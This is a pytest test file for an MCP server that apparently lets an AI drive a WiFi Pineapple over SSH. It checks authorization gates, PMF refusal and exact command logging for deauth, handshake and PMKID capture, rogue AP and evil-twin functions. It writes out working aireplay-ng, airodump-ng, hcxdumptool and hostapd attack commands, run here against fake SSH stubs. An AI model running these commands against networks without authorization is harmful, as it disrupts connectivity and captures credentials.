"""Phase 5 — SSH-driven attack primitives.

Every test asserts three things per plan-organize.md:
  1. authorization gate — no `--i-own-the-airspace` (or allowlist match),
     no transmit.
  2. exact shell invocation is recorded in call_log verbatim.
  3. envelope shape {ok, transport='ssh', payload, timing_ms, warnings[]}.
"""

from __future__ import annotations

import pytest

from p1n3nut5_mcp import attacks
from p1n3nut5_mcp.attacks import Authorization, AuthorizationRequired
from p1n3nut5_mcp.pineapple_ssh import PineappleSSH
from p1n3nut5_mcp.runtime import Config
from tests.conftest import FakeProcResult, make_ssh_connect


def _ssh(replies: dict) -> PineappleSSH:
    cfg = Config.from_env({"PINEAPPLE_HOST": "x", "PINEAPPLE_SSH_PASSWORD": "y"})
    return PineappleSSH(cfg, connect=make_ssh_connect(replies))


# --- authorization -----------------------------------------------------------


async def test_deauth_without_authorization_raises():
    ssh = _ssh({})
    with pytest.raises(AuthorizationRequired, match="airspace authorization missing"):
        await attacks.deauth(bssid="aa:bb:cc:dd:ee:ff", ssh=ssh)


async def test_deauth_bssid_allowlist_lets_through_only_authorized():
    ssh = _ssh(
        {
            "aireplay-ng --deauth 5 -a aa:bb:cc:dd:ee:ff  --reason 7 wlan1mon": FakeProcResult(
                stdout="Sending DeAuth to broadcast\n"
            )
        }
    )
    authz = Authorization(bssid_allowlist=("aa:bb:cc:dd:ee:ff",))
    r = await attacks.deauth(bssid="aa:bb:cc:dd:ee:ff", authorization=authz, ssh=ssh)
    assert r["ok"] is True

    with pytest.raises(AuthorizationRequired, match="not in authorized scope"):
        await attacks.deauth(bssid="99:99:99:99:99:99", authorization=authz, ssh=ssh)


# --- deauth ------------------------------------------------------------------


async def test_deauth_refuses_pmf_required_with_citation():
    ssh = _ssh({})
    authz = Authorization(i_own_the_airspace=True)
    r = await attacks.deauth(
        bssid="aa:bb:cc:dd:ee:ff", authorization=authz, ssh=ssh, target_pmf="required"
    )
    assert r["ok"] is False
    assert r["payload"]["refused"] is True
    assert r["payload"]["reason"] == "pmf-required"
    # PMF citation surfaces in warnings
    assert any("PMF" in w and "plan-knowledge.md" in w for w in r["warnings"])
    # No shell command was sent
    assert ssh.call_log == []


async def test_deauth_records_exact_shell_invocation():
    ssh = _ssh(
        {
            "aireplay-ng --deauth 3 -a aa:bb:cc:dd:ee:ff -c 11:22:33:44:55:66 --reason 7 wlan1mon": FakeProcResult(
                stdout=""
            )
        }
    )
    authz = Authorization(i_own_the_airspace=True)
    r = await attacks.deauth(
        bssid="aa:bb:cc:dd:ee:ff",
        client_mac="11:22:33:44:55:66",
        count=3,
        authorization=authz,
        ssh=ssh,
    )
    assert r["ok"] is True
    assert r["transport"] == "ssh"
    logged = [c.cmd for c in ssh.call_log]
    assert "aireplay-ng --deauth 3 -a aa:bb:cc:dd:ee:ff -c 11:22:33:44:55:66 --reason 7 wlan1mon" in logged


# --- capture_handshake ------------------------------------------------------


async def test_capture_handshake_launches_airodump_and_targeted_deauth():
    airodump = (
        "timeout 30 airodump-ng --bssid aa:bb:cc:dd:ee:ff -w /tmp/handshake-aabbccddeeff "
        "--output-format pcap wlan1mon"
    )
    deauth_cmd = (
        "aireplay-ng --deauth 5 -a aa:bb:cc:dd:ee:ff -c 11:22:33:44:55:66 wlan1mon"
    )
    ssh = _ssh(
        {
            airodump: FakeProcResult(stdout="capture done", exit_status=124),  # timeout normal
            deauth_cmd: FakeProcResult(stdout=""),
        }
    )
    authz = Authorization(i_own_the_airspace=True)
    r = await attacks.capture_handshake(
        bssid="aa:bb:cc:dd:ee:ff",
        timeout_s=30,
        deauth_client="11:22:33:44:55:66",
        authorization=authz,
        ssh=ssh,
    )
    assert r["ok"] is True
    assert r["payload"]["out_path"] == "/tmp/handshake-aabbccddeeff-01.pcap"
    assert r["payload"]["deauth_cmd"] == deauth_cmd
    # both commands are in call_log
    logged = [c.cmd for c in ssh.call_log]
    assert airodump in logged
    assert deauth_cmd in logged


# --- capture_pmkid ----------------------------------------------------------


async def test_capture_pmkid_targeted_uses_bpf_filter():
    cmd = (
        "timeout 60 hcxdumptool -i wlan1 -o /tmp/pmkid.pcapng "
        "--bpfc='ether host aa:bb:cc:dd:ee:ff' --enable_status=1"
    )
    ssh = _ssh({cmd: FakeProcResult(stdout="", exit_status=124)})
    authz = Authorization(i_own_the_airspace=True)
    r = await attacks.capture_pmkid(bssid="aa:bb:cc:dd:ee:ff", authorization=authz, ssh=ssh)
    assert r["ok"] is True
    assert r["payload"]["cmd"] == cmd


# --- rogue AP ---------------------------------------------------------------


async def test_create_rogue_ap_wpa2_uploads_conf_and_launches_hostapd():
    ssh = _ssh({})
    authz = Authorization(i_own_the_airspace=True)
    # Empty reply dict → first `cat >` returns unknown-command exit 1.
    # We want to observe the exact command shape, so accept anything.
    ssh._connect  # touch
    from tests.conftest import FakeSSHConn

    class RecorderSSH(FakeSSHConn):
        async def run(self, command: str, check: bool = False):
            self.calls.append(command)
            if command.startswith("hostapd -B"):
                return FakeProcResult(stdout="", exit_status=0)
            return FakeProcResult(stdout="", exit_status=0)

    async def connect(cfg):
        return RecorderSSH({})

    ssh = PineappleSSH(
        Config.from_env({"PINEAPPLE_HOST": "x", "PINEAPPLE_SSH_PASSWORD": "y"}),
        connect=connect,
    )
    r = await attacks.create_rogue_ap(
        ssid="rogue-corp",
        channel=6,
        security="wpa2_psk",
        psk="testpassword",
        authorization=authz,
        ssh=ssh,
    )
    assert r["ok"] is True
    cmds = [c.cmd for c in ssh.call_log]
    # heredoc upload
    assert any(c.startswith("cat > ") and "hostapd-rogue-corp.conf" in c for c in cmds)
    # launch
    assert any(c.startswith("hostapd -B -P ") for c in cmds)
    # WPA2-PSK config content shows up in the heredoc body
    upload_cmd = next(c for c in cmds if c.startswith("cat > "))
    assert "wpa_passphrase=testpassword" in upload_cmd
    assert "wpa=2" in upload_cmd
    assert "wpa_key_mgmt=WPA-PSK" in upload_cmd


async def test_create_rogue_ap_wpa2_psk_requires_psk():
    from p1n3nut5_mcp import attacks as attacks_mod
    with pytest.raises(ValueError, match="requires psk"):
        attacks_mod._hostapd_conf(
            ssid="x", channel=6, security="wpa2_psk", psk=None, bssid=None,
            iface="wlan0", band="2.4", hidden=False,
        )


# --- evil_twin --------------------------------------------------------------


async def test_evil_twin_clones_and_deauths_when_target_not_pmf():
    from tests.conftest import FakeSSHConn

    class RecorderSSH(FakeSSHConn):
        async def run(self, command: str, check: bool = False):
            self.calls.append(command)
            return FakeProcResult(stdout="", exit_status=0)

    async def connect(cfg):
        return RecorderSSH({})

    ssh = PineappleSSH(
        Config.from_env({"PINEAPPLE_HOST": "x", "PINEAPPLE_SSH_PASSWORD": "y"}),
        connect=connect,
    )
    authz = Authorization(i_own_the_airspace=True)
    r = await attacks.evil_twin(
        target_bssid="aa:bb:cc:dd:ee:ff",
        target_ssid="corp-wifi",
        target_channel=6,
        authorization=authz,
        ssh=ssh,
    )
    assert r["ok"] is True
    cmds = [c.cmd for c in ssh.call_log]
    # rogue AP heredoc + hostapd launch + broadcast deauth
    assert any(c.startswith("cat > ") for c in cmds)
    assert any(c.startswith("hostapd -B") for c in cmds)
    assert any(c.startswith("aireplay-ng --deauth") for c in cmds)
